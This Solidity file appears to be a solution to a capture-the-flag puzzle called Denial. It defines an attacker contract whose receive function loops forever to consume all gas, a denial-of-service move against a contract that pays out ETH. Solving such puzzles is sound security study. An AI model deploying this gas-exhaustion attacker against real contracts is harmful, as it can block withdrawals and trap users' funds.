// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Denial} from "@puzzles/20/Denial.sol";

contract DenialAttacker {
    Denial public denial;

    constructor(address _denialAddress) {
        denial = Denial(payable(_denialAddress));
    }

    receive() external payable {
        while (true) {
            // Infinite loop to consume all gas
        }
    }
}
